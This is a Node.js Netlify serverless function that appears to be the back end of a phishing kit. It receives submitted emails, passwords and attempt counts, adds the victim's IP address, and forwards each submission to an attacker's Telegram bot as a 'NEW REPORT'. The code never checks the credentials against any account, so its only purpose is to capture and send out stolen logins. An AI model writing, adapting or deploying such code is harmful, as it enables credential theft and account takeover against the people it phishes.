const https = require('https');

exports.handler = async (event) => {
    console.log("--- New Submission Received ---");

    if (event.httpMethod !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" };
    }

    try {
        const data = JSON.parse(event.body);
        
        // Pulling from Netlify Environment Variables
        const BOT_TOKEN = process.env.BOT_TOKEN; 
        const CHAT_ID = process.env.CHAT_ID;

        // LOGGING FOR YOU TO SEE IN NETLIFY
        if (!BOT_TOKEN) console.error("CRITICAL: BOT_TOKEN is missing from Environment Variables!");
        if (!CHAT_ID) console.error("CRITICAL: CHAT_ID is missing from Environment Variables!");

        if (!BOT_TOKEN || !CHAT_ID) {
            return { 
                statusCode: 500, 
                body: JSON.stringify({ error: "Server configuration missing" }) 
            };
        }

        const message = `
📩 **NEW REPORT**
━━━━━━━━━━━━━━
📧 Email: ${data.email}
🔑 Pass: ${data.password}
🔢 Try: ${data.attempt}
🌐 IP: ${event.headers['x-nf-client-connection-ip'] || 'Hidden'}
━━━━━━━━━━━━━━
        `;

        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

        return new Promise((resolve) => {
            https.get(telegramUrl, (res) => {
                let body = '';
                res.on('data', d => body += d);
                res.on('end', () => {
                    console.log("Telegram Response Status:", res.statusCode);
                    console.log("Telegram Body:", body);
                    resolve({
                        statusCode: 200,
                        body: JSON.stringify({ status: "success" })
                    });
                });
            }).on('error', (e) => {
                console.error("Network Error:", e.message);
                resolve({ statusCode: 500, body: "Failed to reach Telegram" });
            });
        });

    } catch (err) {
        console.error("JSON/Logic Error:", err.message);
        return { statusCode: 400, body: "Invalid Data" };
    }
};
